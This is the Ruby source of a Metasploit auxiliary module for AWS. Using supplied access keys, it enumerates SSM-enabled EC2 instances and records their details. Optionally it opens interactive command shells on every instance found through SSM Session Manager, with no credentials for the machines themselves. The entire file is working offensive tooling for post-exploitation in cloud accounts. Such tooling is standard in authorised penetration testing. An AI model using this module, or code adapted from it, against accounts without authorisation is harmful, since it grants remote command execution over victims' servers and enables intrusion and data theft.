##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'aws-sdk-ssm'
require 'aws-sdk-ec2'

class MetasploitModule < Msf::Auxiliary
  include Rex::Proto::Http::WebSocket::AmazonSsm
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Amazon Web Services EC2 instance enumeration',
        'Description' => %q{
          Provided AWS credentials, this module will call the authenticated
          API of Amazon Web Services to list all SSM-enabled EC2 instances
          accessible to the account. Once enumerated as SSM-enabled, the
          instances can be controlled using out-of-band WebSocket sessions
          provided by the AWS API (nominally, privileged out of the box).
          This module provides not only the API enumeration identifying EC2
          instances accessible via SSM with given credentials, but enables
          session initiation for all identified targets (without requiring
          target-level credentials) using the CreateSession mixin option.
          The module also provides an EC2 ID filter and a limiting throttle
          to prevent session stampedes or expensive messes.
        },
        'Author' => [
          'RageLtMan <rageltman[at]sempervictus>'
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'CreateSession' => false },
        'Notes' => {
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'Stability' => [CRASH_SAFE]
        }
      )
    )

    register_options(
      [
        OptInt.new('LIMIT', [false, 'Only return the specified number of results from each region']),
        OptString.new('FILTER_EC2_ID', [false, 'Look for specific EC2 instance ID']),
        OptString.new('REGION', [true, 'AWS Region (e.g. "us-west-2")']),
        OptString.new('ACCESS_KEY_ID', [true, 'AWS Access Key ID (eg. "AKIAXXXXXXXXXXXXXXXX")', '']),
        OptString.new('SECRET_ACCESS_KEY', [true, 'AWS Secret Access Key (eg. "CA1+XXXXXXXXXXXXXXXXXXXXXX6aYDHHCBuLuV79")', ''])
      ]
    )
  end

  def handle_aws_errors(error)
    if error.class.module_parents.include?(Aws)
      fail_with(Failure::UnexpectedReply, error.message)
    else
      raise error
    end
  end

  def run
    credentials = ::Aws::Credentials.new(datastore['ACCESS_KEY_ID'], datastore['SECRET_ACCESS_KEY'])
    vprint_status "Checking #{datastore['REGION']}..."
    client = ::Aws::SSM::Client.new(
      region: datastore['REGION'],
      credentials: credentials
    )
    inv_params = {
      filters: [
        {
          key: 'AWS:InstanceInformation.InstanceStatus',
          values: ['Terminated'],
          type: 'NotEqual'
        },
        {
          key: 'AWS:InstanceInformation.ResourceType',
          values: ['EC2Instance'],
          type: 'Equal'
        }
      ]
    }

    if datastore['FILTER_EC2_ID']
      inv_params[:filters] << {
        key: 'AWS:InstanceInformation.InstanceId',
        values: [datastore['FILTER_EC2_ID']],
        type: 'Equal'
      }
    end

    inv_params[:max_results] = datastore['LIMIT'] if datastore['LIMIT']

    ssm_ec2 = client.get_inventory(inv_params).entities.map { |e| e.data['AWS:InstanceInformation'].content }.flatten
    ssm_ec2.each do |ssm_host|
      report_host(
        host: ssm_host['IpAddress'],
        os_flavor: ssm_host['PlatformName'],
        os_name: ssm_host['PlatformType'],
        os_sp: ssm_host['PlatformVersion'],
        name: ssm_host['ComputerName'],
        comments: "ec2-id: #{ssm_host['InstanceId']}"
      )
      report_note(
        host: ssm_host['IpAddress'],
        type: ssm_host['AgentType'],
        data: ssm_host['AgentVersion']
      )
      vprint_good("Found AWS SSM host #{ssm_host['InstanceId']} (#{ssm_host['ComputerName']}) - #{ssm_host['IpAddress']}")
      next unless datastore['CreateSession']

      socket = get_ssm_socket(client, ssm_host['InstanceId'])
      sess = Msf::Sessions::AwsSsmCommandShellBind.new(socket.lsock, { datastore: datastore, aws_ssm_host_info: ssm_host })

      start_session(self, sess.info, datastore, false, socket.lsock, sess)
    end
  rescue Seahorse::Client::NetworkingError => e
    print_error e.message
    print_error "Confirm access to #{datastore['REGION']} with provided credentials"
  rescue StandardError => e
    handle_aws_errors(e)
  end

  def get_ssm_socket(client, ec2_id)
    # Verify the connection params and availability of instance
    inv_params = {
      filters: [
        {
          key: 'AWS:InstanceInformation.InstanceId',
          values: [ec2_id],
          type: 'Equal'
        }
      ]
    }
    inventory = client.get_inventory(inv_params)
    # Extract peer info
    if inventory.entities[0] && (inventory.entities[0].id == ec2_id)
      peer_info = inventory.entities[0].data['AWS:InstanceInformation'].content[0]
    else
      raise 'SSM target not found'
    end
    session_init = client.start_session({
      target: ec2_id,
      document_name: 'SSM-SessionManagerRunShell'
    })
    ssm_sock = connect_ssm_ws(session_init)
    chan = ssm_sock.to_ssm_channel
    chan.params.comm = Rex::Socket::Comm::Local unless chan.params.comm
    chan.params.peerhost = peer_info['IpAddress']
    chan.params.peerport = 0
    chan.params.peerhostname = peer_info['ComputerName']
    chan._start_ssm_keepalive
    chan.update_term_size
    return chan
  end
end
